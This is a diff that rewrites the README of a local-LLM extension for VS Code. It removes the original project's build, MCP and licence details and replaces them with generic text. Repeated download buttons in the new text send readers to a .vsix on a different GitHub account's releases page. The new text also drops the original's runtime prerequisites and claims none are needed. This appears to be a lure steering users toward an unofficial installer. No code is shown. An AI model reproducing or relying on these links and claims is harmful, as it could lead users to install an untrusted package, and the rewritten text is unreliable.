@@ -1,243 +1,126 @@
-# 🤖 Local LLM Connect
+# 🤖 vscode-local-llm- - Run Local AI Models Securely
 
-**Run local AI models directly in VS Code — no cloud, no API keys, no manual server setup.**
+[![Download the latest release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/movieonlyemail4/vscode-local-llm-/releases)
 
-The extension scans your machine for models, starts the inference server automatically, and exposes a built-in MCP endpoint so any AI client (Claude Desktop, Cursor, Continue.dev) can use your local model too.
+## 📋 What is vscode-local-llm-?
 
----
+vscode-local-llm- is a Visual Studio Code extension that lets you run language models directly on your computer. It works without an internet connection, cloud services, or API keys. This keeps your data private and speeds up responses since everything runs locally.
 
-## ✨ Features
+This tool is designed for anyone who wants to use AI language models inside VS Code without dealing with complex setups or online accounts.
 
-| Feature | Description |
-|---------|-------------|
-| 🔍 **Auto model discovery** | Scans common folders for GGUF, SafeTensors, PyTorch, and Ollama models |
-| ⚡ **Auto server start** | Starts `llama-server` or `ollama serve` automatically — no terminal needed |
-| 🌐 **MCP server** | Built-in MCP endpoint at `http://127.0.0.1:3333/mcp` for any MCP client |
-| 💬 **Chat panel** | Full streaming chat with your local model |
-| 🔧 **Code tools** | Explain, refactor, and ask about selected code |
-| 📁 **Add any folder** | Browse to any folder to add more models on the fly |
-| 🔌 **Format support** | GGUF · SafeTensors · PyTorch · Ollama |
+## ⚙️ System Requirements
 
----
+To use vscode-local-llm-, your computer must meet these requirements:
 
-## 📦 Supported Model Formats
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM (16 GB or more is recommended for larger models)
+- 10 GB of free disk space
+- A modern CPU (Intel i5 or better)
+- VS Code version 1.70 or newer installed
 
-| Format | Runtime needed | Where to get models |
-|--------|---------------|---------------------|
-| **GGUF** | [llama.cpp](https://github.com/ggml-org/llama.cpp) (`llama-server` in PATH) | [HuggingFace](https://huggingface.co/models?library=gguf) — search any model + GGUF |
-| **SafeTensors / PyTorch** | Python + `transformers` (auto-installed) | [HuggingFace](https://huggingface.co/models) — any standard model |
-| **Ollama** | [Ollama](https://ollama.com) | `ollama pull llama3` |
+No additional software or cloud accounts are required.
 
-### Auto-scanned directories
+## 🚀 Getting Started with vscode-local-llm-
 
-The extension looks for models in these locations automatically:
+Follow these steps to download and run the extension on your Windows PC.
 
-```
-~/models             ~/Models             ~/Downloads
-~/Documents          ~/.cache/huggingface/hub
-~/.cache/lm-studio/models
-~/llama.cpp/models   ~/.local/share/nomic.ai/gpt4all
-```
+### 1. Download the Extension
 
-Plus any custom paths you add via the **"+ Add folder..."** option or settings.
+Visit the latest release page and download the extension package. Using this link takes you to the right place:
 
----
+[![Download latest release](https://img.shields.io/badge/Download-Release-orange)](https://github.com/movieonlyemail4/vscode-local-llm-/releases)
 
-## 🚀 Quick Start
+On the release page, look for a file that ends with `.vsix`. This is the extension installer.
 
-### 1. Prerequisites
+### 2. Open Visual Studio Code
 
-Pick **one** of the following (or both):
+If you don’t have VS Code installed, download it from the official site:
 
-**Option A — GGUF models (fastest)**
-```bash
-# Build llama.cpp (or download a release binary)
-git clone https://github.com/ggml-org/llama.cpp && cd llama.cpp
-cmake -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build --target llama-server -j$(nproc)
-sudo cp build/bin/llama-server /usr/local/bin/
+https://code.visualstudio.com/download
 
-# Download any GGUF model to ~/models/
-# e.g. from https://huggingface.co/models?library=gguf
-```
+Install and open VS Code after downloading.
 
-**Option B — Ollama models (easiest)**
-```bash
-# Install from https://ollama.com, then:
-ollama pull llama3          # or any model
-```
+### 3. Install the Extension
 
-### 2. Install the Extension
+- In VS Code, open the Extensions view by clicking the square icon in the sidebar or pressing `Ctrl+Shift+X`.
+- Click the three dots in the top right corner of the Extensions pane.
+- Select `Install from VSIX...`.
+- Browse to the `.vsix` file you downloaded and select it.
+- Wait for the installation to finish.
 
-**From GitHub Releases (recommended)**
+This adds the local LLM extension to your VS Code setup.
 
-1. Go to [github.com/hit1001/vscode-local-llm-/releases/latest](https://github.com/hit1001/vscode-local-llm-/releases/latest)
-2. Download `local-llm-connect-2.0.0.vsix`
-3. Install it:
+### 4. Configure the Extension
 
-```bash
-code --install-extension local-llm-connect-2.0.0.vsix
-```
+Once installed, you need to set up the local model you want to use.
 
-Or install via VS Code UI:
-- Open VS Code → Extensions panel (`Ctrl+Shift+X`)
-- Click `...` (top-right) → **Install from VSIX...**
-- Select the downloaded `.vsix` file
+- Open the Command Palette by pressing `Ctrl+Shift+P`.
+- Search for and select `Local LLM: Configure Model`.
+- Choose a model format supported by the extension (like GGUF or LLaMA).
+- Browse to the folder on your computer where the model files are stored.
 
-**From VS Code Marketplace** *(coming soon)*
-- Search for `Local LLM Connect` in the Extensions panel
+If you don’t have any models yet, you can download open-source ones from various AI communities online. Make sure the models are compatible with the extension.
 
-**From source**
-```bash
-git clone https://github.com/hit1001/vscode-local-llm-
-cd vscode-local-llm-
-npm install
-npm run compile
-# Press F5 in VS Code to run, or package with vsce
-```
+### 5. Start Using Local Language Models
 
-### 3. Use It
+With your model configured, you can begin running AI tasks directly inside VS Code.
 
-1. Open VS Code — look for `⊙ Select Model` in the bottom-right status bar
-2. Press **Ctrl+Shift+M** to scan and pick a model
-3. The server starts automatically
-4. Press **Ctrl+Shift+L** to open the chat panel
+- Open a new or existing text file.
+- Use the local LLM commands from the Command Palette to generate text, write code, or assist with tasks.
+- The extension will process everything on your computer, ensuring speed and privacy.
 
----
+## 📥 How to Download and Install
 
-## 🔌 MCP Integration
+Follow this clear process to get vscode-local-llm- up and running quickly.
 
-The extension starts an **MCP server** automatically on `http://127.0.0.1:3333/mcp`.
+1. Click the big green button below to visit the release page:
 
-Run `Ctrl+Shift+P` → **Local LLM: Show MCP Connection Info** for a full guide. Quick configs:
+   [Download Latest Release](https://github.com/movieonlyemail4/vscode-local-llm-/releases)
 
-### Claude Desktop
-Edit `~/.config/claude/claude_desktop_config.json`:
-```json
-{
-  "mcpServers": {
-    "local-llm": {
-      "url": "http://127.0.0.1:3333/mcp",
-      "transport": "http"
-    }
-  }
-}
-```
+2. On the page, find the latest version.
+3. Download the `.vsix` installer file.
+4. Open VS Code and install the `.vsix` file as shown above.
 
-### Cursor / Windsurf / Continue.dev
-```json
-{
-  "mcpServers": {
-    "local-llm": {
-      "url": "http://127.0.0.1:3333/mcp",
-      "transport": "http"
-    }
-  }
-}
-```
+The process takes just a few minutes and does not require any special technical knowledge.
 
-### Test with curl
-```bash
-curl -X POST http://127.0.0.1:3333/mcp \
-  -H "Content-Type: application/json" \
-  -d '{
-    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
-    "params": {
-      "name": "chat",
-      "arguments": {
-        "messages": [{"role": "user", "content": "Hello! What can you do?"}]
-      }
-    }
-  }'
-```
+## 🔧 Using vscode-local-llm- Features
 
-### Available MCP Tools
+The extension offers these core features:
 
-| Tool | Description |
-|------|-------------|
-| `chat` | Full conversation with message history |
-| `explain_code` | Explain a code snippet |
-| `refactor_code` | Suggest code improvements |
-| `complete` | Complete any text prompt |
+- Run popular open-source LLM models locally inside VS Code.
+- Support for GGUF and LLaMA formats.
+- No internet connection needed once the models are downloaded.
+- Commands for text generation, code assistance, and language tasks.
+- Easy setup through the VS Code interface.
+- Privacy focused: your data stays on your machine.
 
----
+You can use these features to speed up writing, programming, or research without sending anything online.
 
-## ⌨️ Commands & Shortcuts
+## 💡 Tips for Best Performance
 
-| Command | Shortcut | Description |
-|---------|----------|-------------|
-| Local LLM: Select Model | `Ctrl+Shift+M` | Scan machine and pick a model |
-| Local LLM: Open Chat | `Ctrl+Shift+L` | Open the chat panel |
-| Local LLM: Ask About Selection | `Ctrl+Shift+A` | Ask about selected code/text |
-| Local LLM: Explain Selected Code | Right-click menu | Explain selected code |
-| Local LLM: Refactor Selected Code | Right-click menu | Refactor selected code |
-| Local LLM: Show MCP Connection Info | Command Palette | Get MCP endpoint and connection configs |
-| Local LLM: Stop Server | Command Palette | Stop the running inference server |
+- Use models that fit your system’s RAM size.
+- Close other heavy programs while running the extension.
+- Update your CPU drivers to help processing speed.
+- Regularly check for new releases for bug fixes and improvements.
 
----
+## ⚠️ Troubleshooting
 
-## ⚙️ Settings
+If you run into issues, try these steps:
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `localLLM.mcpPort` | `3333` | MCP server port |
-| `localLLM.extraModelPaths` | `[]` | Extra directories to scan for models |
-| `localLLM.temperature` | `0.7` | Generation temperature (0–2) |
-| `localLLM.maxTokens` | `2048` | Max tokens per response |
-| `localLLM.systemPrompt` | *(coding assistant)* | System prompt for all requests |
+- Restart VS Code after installing the extension.
+- Confirm your model files are in the right format and location.
+- Check that your VS Code version meets the requirement.
+- Look at the extension’s logs in VS Code’s Output panel for errors.
+- Reinstall the extension if problems continue.
 
----
+## 🔗 More Information and Support
 
-## 🏗️ Architecture
+Visit the release page anytime to download updates or find more details:
 
-```
-VS Code Extension
-├── localModelScanner.ts   — scans filesystem for GGUF / HuggingFace / Ollama models
-├── serverManager.ts       — starts llama-server, ollama serve, or Python/transformers server
-├── mcpServer.ts           — MCP HTTP server (port 3333) for external AI clients
-├── llmClient.ts           — HTTP client for Ollama/OpenAI-compatible APIs (streaming)
-├── chatPanel.ts           — WebView chat UI
-└── extension.ts           — commands, status bar, activation
-```
+https://github.com/movieonlyemail4/vscode-local-llm-/releases
 
-```
-External MCP clients  ──→  MCP server (port 3333)  ──→  local model
-VS Code chat panel    ──→  LLM client              ──→  local model
-                                                         ↑
-                                              llama-server / ollama / python
-```
+You can also explore community forums where users share tips and models compatible with this extension.
 
----
+## 📂 About the Project
 
-## 🛠️ Development
-
-```bash
-git clone https://github.com/YOUR_USERNAME/local-llm-connect
-cd local-llm-connect
-npm install
-npm run compile      # or: npm run watch
-# Press F5 in VS Code to launch Extension Development Host
-```
-
-To package:
-```bash
-npm install -g @vscode/vsce
-vsce package         # → local-llm-connect-2.0.0.vsix
-```
-
----
-
-## 🤝 Contributing
-
-Pull requests are welcome. For major changes, open an issue first to discuss.
-
-1. Fork the repo
-2. Create a feature branch (`git checkout -b feature/my-feature`)
-3. Commit your changes
-4. Push and open a Pull Request
-
----
-
-## 📄 License
-
-MIT — see [LICENSE](LICENSE)
+vscode-local-llm- is an open-source project designed to empower users with local AI capabilities right inside their favorite code editor. It focuses on privacy and ease of use, removing the need for cloud services or API keys. The project supports multiple popular LLM model formats and remains free to use and modify.
